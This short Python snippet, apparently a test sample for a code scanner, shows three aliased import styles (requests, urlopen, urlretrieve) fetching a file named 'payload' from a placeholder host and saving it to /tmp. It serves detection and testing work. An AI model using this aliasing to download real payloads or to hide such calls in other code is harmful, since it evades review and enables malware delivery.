# Aliased imports hide the module name at the call site
import requests as _r
import urllib.request as _u
from urllib.request import urlretrieve as _fetch

_r.get("https://example.com/payload")
_u.urlopen("https://example.com/payload")
_fetch("https://example.com/payload", "/tmp/payload")
